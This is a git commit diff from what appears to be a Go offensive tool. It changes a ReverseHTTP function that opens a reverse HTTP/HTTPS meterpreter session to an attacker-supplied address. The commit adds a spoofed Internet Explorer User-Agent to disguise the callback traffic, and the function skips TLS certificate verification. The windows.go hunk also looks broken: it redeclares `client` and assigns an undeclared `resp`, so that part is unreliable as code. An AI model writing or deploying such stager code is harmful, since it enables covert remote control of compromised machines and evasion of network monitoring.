d05c507935e80fa50db31c6e429f6695f05197ee
Ege Balcı <egebalci@pm.me>
2020-07-21 14:28:08 +0300

    Special meterpreter user-agent added

--- nix.go
+++ nix.go
@@ -67,17 +67,18 @@ func EnableCrtPinning(fingerprint []byte) error {
 
 // ReverseHTTP initiates a new reverse HTTP/HTTPS meterpreter connection
 func ReverseHTTP(connType, address string) error {
-	var (
-		resp *http.Response
-		err  error
-	)
 	url := connType + "://" + address + "/" + NewURI(rand.Intn(123)+5)
 	client := &http.Client{}
 	if connType == "https" {
 		transport := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
 		client = &http.Client{Transport: transport}
 	}
-	resp, err = client.Get(url)
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return err
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko")
+	resp, err := client.Do(req)
 	if err != nil {
 		return err
 	}
--- windows.go
+++ windows.go
@@ -80,16 +80,19 @@ func EnableCrtPinning(fingerprint []byte) error {
 
 // ReverseHTTP initiates a new reverse HTTP/HTTPS meterpreter connection
 func ReverseHTTP(connType, address string) error {
-	var (
-		resp *http.Response
-		err  error
-	)
 	url := connType + "://" + address + "/" + NewURI(rand.Intn(123)+5)
-
+	client := &http.Client{}
 	if connType == "https" {
-		http.DefaultTransport = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
+		transport := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
+		client = &http.Client{Transport: transport}
 	}
-	resp, err = http.Get(url)
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return err
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko")
+	client := &http.Client{}
+	resp, err = client.Do(req)
 	if err != nil {
 		return err
 	}
